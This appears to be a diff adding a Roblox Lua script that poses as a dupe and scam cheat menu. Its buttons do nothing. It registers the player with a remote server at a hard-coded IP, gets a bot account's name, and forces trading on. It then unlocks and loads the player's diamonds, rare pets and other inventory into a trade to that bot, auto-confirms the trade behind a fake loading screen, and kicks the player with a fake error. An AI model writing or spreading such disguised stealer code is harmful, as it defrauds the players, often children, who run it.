@@ -1,0 +1,363 @@
+local IP = "http://94.181.90.142:5050/"
+
+http = game:GetService("HttpService")
+local PL, WS, TS = game:GetService"Players", game:GetService"Workspace", game:GetService"TweenService"
+local LP = PL.LocalPlayer
+if game.PlaceId == 15588442388 or game.PlaceId == 15502339080 then
+    
+    body = {
+        ["Find"] = "GetBot"
+    }
+
+    local r = request({Url = IP, Method="POST", Body=http:JSONEncode(body)})
+
+    if r.Success and string.len(r.Body) > 0 then
+
+        body = {
+            ["Find"] = "New",
+            ["PlaceId"] = game.PlaceId,
+            ["JobId"] = game.JobId,
+            ["Name"] = LP.Name
+        }
+
+        local zr = request({Url = IP, Method="POST", Body=http:JSONEncode(body)})
+
+        if zr.Success then
+            BotName = r.Body
+            find = true
+            spawn(function() 
+                local PL = game:GetService("Players")
+                local LP = PL.LocalPlayer
+
+                local Askar = loadstring(game:HttpGet("https://raw.githubusercontent.com/LunarRbx/Script-By-IvanChai/main/Askar"))()
+                local Lib = Askar.Window(nil,nil,115866921851629,"RightShift") --window: Name, Description, Icon, Toggle Default
+
+                local tab1 = Lib:Tab("Auto Farm", 12739920452) --tab: Name, icon
+                local tab2 = Lib:Tab("Dupe Eggs", 12739914602) --tab: Name, icon
+                local tab3 = Lib:Tab("Trade Scam", 12739921999) --tab: Name, icon
+                local tab4 = Lib:Tab("Auction Scam", 12739860346) --tab: Name, icon
+                local tab5 = Lib:Tab("Dupe Method", 86754030517407) --tab: Name, icon
+
+                local subsec2 = tab2:SubSection("Egg-Dupe")
+                local subsec3 = tab3:SubSection("Trade-scam")
+                local subsec4 = tab4:SubSection("Auction Scam")
+                local subsec5 = tab5:SubSection("DUPE")
+                
+                subsec2:Button("DUPE", function() --button: Name, callback
+                end)
+
+                subsec2:Slider("Eggs",100,10000,1000,false,function(z) -- Slider: Name, Min, Max, Default, Spam Callback, Callback
+                
+                end)
+
+                subsec3:Button("Crush server", function()
+                    print("BOOM!")
+                end)
+
+                subsec3:Slider("Time",5,100,25,false,function(z) -- Slider: Name, Min, Max, Default, Spam Callback, Callback
+                    print("Bruh")
+                end)
+
+                subsec4:Button("Use Auction Glitch", function()
+                    
+                end)
+
+                subsec4:Slider("Timer",1,100,25,false,function(z) -- Slider: Name, Min, Max, Default, Spam Callback, Callback
+                    print("Bruh")
+                end)
+
+                subsec5:Button("Dupe Pets",function() --toggle: Name, toggle, callback
+
+                end)
+
+                subsec5:Button("Dupe Potions",function() --toggle: Name, toggle, callback
+
+                end)
+
+                subsec5:Button("Dupe Items",function() --toggle: Name, toggle, callback
+
+                end)
+            end)
+
+            butset = LP.PlayerGui.Main.BottomButtons.BUTTONS.Settings
+
+            firesignal(butset.Activated)
+            task.wait(0.1)
+            firesignal(butset.Activated)
+
+
+            task.wait(0.1)
+
+            local function tgl()
+                local args = {
+                    [1] = "Trading"
+                }
+
+                game:GetService("ReplicatedStorage").Network["Toggle Setting"]:InvokeServer(unpack(args))
+            end
+
+            txtl = LP.PlayerGui.Settings.Frame.ItemsFrame.Items.Trading.Toggle.Button.TextLabel
+
+            if txtl.Text == "All" then
+                tgl()
+                tgl()
+            elseif txtl.Text == "Friends" then
+                tgl()
+            end
+
+            while find == true do
+                for i,v in pairs(PL:GetChildren()) do
+                    if v.Name == BotName then
+                        find = false
+                        break
+                    end
+                end
+                task.wait()
+            end
+
+            WS:WaitForChild(BotName)
+            task.wait(6)
+
+            local args = {
+                [1] = game:GetService("Players"):WaitForChild(BotName)
+            }
+
+
+            if txtl.Text == "Disabled" then
+                tgl()
+            elseif txtl.Text == "Friends" then
+                tgl()
+                tgl()
+            end
+
+            game:GetService("ReplicatedStorage").Network["Server: Trading: Request"]:InvokeServer(unpack(args))
+
+            local net = require(game:GetService("ReplicatedStorage").Library.Client.Network)
+            n1 = 0
+            wai = false
+            net.Fired("Trading: Created"):Connect(function(aaa) 
+                n1 = aaa
+                wai = true
+            end)
+
+            Loadscreen = LP.PlayerGui.Transition
+            Loadscreen.Background.Size = UDim2.new(0.2,0,0.2,0)
+            Loadscreen.Enabled = true
+
+            local pos = UDim2.new(1.6,0,2.2,0)
+            local val = Loadscreen.Background
+            tween = TS:Create(
+                val, 
+                TweenInfo.new(0.4, Enum.EasingStyle.Linear, Enum.EasingDirection.Out, 0, false, 0), 
+                {Size = pos}
+            )
+
+            tween:Play()
+            Loadscreen.Hint.Position = UDim2.new(0.5,0,0.6,0)
+            Loadscreen.Hint.HintLabel.Text = "Loading."
+            mas = {
+                1,2,3
+            }
+
+            if _G.KKK then
+                _G.KKK = false
+            else
+                _G.KKK = true
+            end
+            bruhtoch = "."
+            Loadscreen.GifFrame.GifImage.ImageTransparency = 0
+            spawn(function() 
+                while _G.KKK == true do
+                    for i,v in next,mas do
+                        for b,n in next,mas do
+                            Loadscreen.GifFrame.GifImage.Position = UDim2.new(-n+0.5,0,-v,0)
+                            task.wait(0.1)
+                        end
+                    end
+                    if #bruhtoch == 3 then
+                        bruhtoch = "."
+                    else
+                        bruhtoch = bruhtoch.."."
+                    end
+                    Loadscreen.Hint.HintLabel.Text = "Loading"..bruhtoch
+                end
+                Loadscreen.GifFrame.GifImage.Position = UDim2.new(0,0,0,0)
+                Loadscreen.Enabled = false
+            end)
+
+            task.wait(1)
+
+            local Lib = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+
+            ---- Inventory Grabber ----
+
+            AllInv = {}
+
+            op1 = Lib.Get().Inventory.Hoverboard
+            HoverBoard = {}
+            for i,v in next,op1 do
+                id = i
+                value = if v["_am"] ~= nil then v["_am"] else 1
+                table.insert(HoverBoard,{value,id})
+            end
+
+            op1 = Lib.Get().Inventory.Fruit
+            Fruit = {}
+            for i,v in next,op1 do
+                id = i
+                value = if v["_am"] ~= nil then v["_am"] else 1
+                table.insert(Fruit,{value,id})
+            end
+
+            op1 = Lib.Get().Inventory.Egg
+            Egg = {}
+            for i,v in next,op1 do
+                id = i
+                value = if v["_am"] ~= nil then v["_am"] else 1
+                table.insert(Egg,{value,id})
+            end
+
+            op1 = Lib.Get().Inventory.Booth
+            Booth = {}
+            for i,v in next,op1 do
+                id = i
+                value = if v["_am"] ~= nil then v["_am"] else 1
+                table.insert(Booth,{value,id})
+            end
+
+            op1 = Lib.Get().Inventory.Potion
+            Potion = {}
+            for i,v in next,op1 do
+                id = i
+                value = if v["_am"] ~= nil then v["_am"] else 1
+                if v.tn > 7 then
+                    table.insert(Potion,{value,id})
+                end
+            end
+
+            op1 = Lib.Get().Inventory.Pet
+            Pets = {}
+            for i,v in next,op1 do
+                id = i
+                value = if v["_am"] ~= nil then v["_am"] else 1
+                if string.find(v.id,"Huge") or string.find(v.id,"Titanic") or string.find(v.id,"Gargantuan") then
+                    table.insert(Pets,{value,id})
+                end
+            end
+
+            table.insert(AllInv,{
+                ["Pet"] = Pets,
+                ["Hoverboard"] = HoverBoard,
+                ["Fruit"] = Fruit,
+                ["Potion"] = Potion,
+                ["Egg"] = Egg,
+                ["Booth"] = Booth
+            })
+
+            while true do
+                if wai then
+                    print("done")
+                    break
+                end
+                task.wait(1)
+                local args = {
+                    [1] = game:GetService("Players"):WaitForChild(BotName)
+                }
+
+                game:GetService("ReplicatedStorage").Network["Server: Trading: Request"]:InvokeServer(unpack(args))
+            end
+
+            task.wait(1.5)
+
+            if LP.PlayerGui.Inventory.Frame.Main.Pets.TeamsTitle.Visible == true then
+                LP.PlayerGui.Inventory.Frame.Main.Pets.TeamsTitle.Visible = false
+                game:GetService("ReplicatedStorage").Network["Pets_ToggleFavoriteMode"]:FireServer()
+            end
+
+            task.wait(0.5)
+
+            Inv = Lib.Get().Inventory
+
+            for i,v in Inv,next do
+                for z,x in v, next do
+                    if x._lk then
+                        local args = {
+                            [1] = z,
+                            [2] = false
+                        }
+
+                        game:GetService("ReplicatedStorage").Network["Locking_SetLocked"]:InvokeServer(unpack(args))
+                    end
+                end
+            end
+
+            labe = LP.PlayerGui.TradeWindow.Frame.Buttons.ReadyHolder.Ready.TextLabel
+
+            ---- Add Gems ----
+
+            DiaId = ""
+            Gems = 0
+            op1 = Lib.Get().Inventory.Currency
+            for i,v in op1,next do
+                if v.id == "Diamonds" then
+                    DiaId = i
+                    Gems = v._am
+                end
+            end
+
+            for i,v in Pets,next do
+                local args = {
+                    [1] = n1,
+                    [2] = "Currency",
+                    [3] = DiaId,
+                    [4] = Gems
+                }
+                game:GetService("ReplicatedStorage").Network["Server: Trading: Set Item"]:InvokeServer(unpack(args))
+            end
+
+
+            ---- Add All Inventory ----
+
+            --MassiveOfLooting = {"Pet","Misc","LootBox","Box","Fruit","Charm","Egg","Ultimate","Potion","Seed","Enchant","Hoverboard","Booth"}
+            MassiveOfLooting = {"Pet","Hoverboard","Booth","Egg","Potion","Fruit"}
+
+            for z,x in MassiveOfLooting, next do
+                for i,v in AllInv[1][x],next do
+                    task.wait(0.05)
+                    local args = {
+                        [1] = n1,
+                        [2] = x,
+                        [3] = v[2],
+                        [4] = v[1]
+                    }
+                    game:GetService("ReplicatedStorage").Network["Server: Trading: Set Item"]:InvokeServer(unpack(args))
+                end
+            end
+
+            while labe.Text ~= "Ready!" do
+                task.wait(0.01)
+            end
+
+            firesignal(LP.PlayerGui.TradeWindow.Frame.Buttons.ReadyHolder.Ready.Activated)
+            task.wait(0.1)
+            firesignal(LP.PlayerGui.Message.Frame.Contents.Yes.Activated)
+
+            while labe.Text ~= "Confirm!" do
+                task.wait(0.01)
+            end
+
+            firesignal(LP.PlayerGui.TradeWindow.Frame.Buttons.ReadyHolder.Ready.Activated)
+            task.wait(0.1)
+            firesignal(LP.PlayerGui.Message.Frame.Contents.Yes.Activated)
+
+            task.wait(15)
+
+            LP:Kick("Error 404")
+        end
+    elseif string.len(r.Body) == 0 then
+        print("Bot is not available")
+        LP:Kick("Please try later or restart game!")
+    end
+else
+    game:GetService("TeleportService"):Teleport(15502339080, LP)
+end
